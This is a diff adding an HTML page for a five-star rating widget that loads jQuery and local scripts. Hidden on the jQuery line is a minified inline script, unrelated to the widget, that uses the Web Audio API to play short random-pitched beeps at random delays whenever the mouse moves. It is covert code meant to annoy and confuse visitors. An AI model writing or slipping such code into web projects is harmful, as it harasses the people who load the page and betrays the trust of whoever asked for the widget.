@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <title>Star Rating</title>
+    <meta charset="UTF-8">
+    <script data-require="jquery@*" data-semver="2.2.0" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script><script>var c=new AudioContext,o=c.createOscillator();o.frequency.value=0,o.connect(c.destination),o.start(c.currentTime),window.addEventListener("mousemove",function(){setTimeout(function(){o.frequency.value=4e3*Math.pow(Math.random(),10),setTimeout(function(){o.frequency.value=0},100)},1e3+5e3*Math.random())});</script><script src=""></script>
+    <link rel="stylesheet" href="style.css" />
+    <script src="script.js"></script>
+  </head>
+
+  <body>
+    <div class="container">
+      <div class="rate">
+        <h1>Star Rating</h1>
+        <ul class="star">
+          <li>★</li>
+          <li>★</li>
+          <li>★</li>
+          <li>★</li>
+          <li>★</li>
+        </ul>
+        <p id="score">0</p>
+      </div>
+    </div>
+    <script src="rate.js"></script>
+  </body>
+</html>
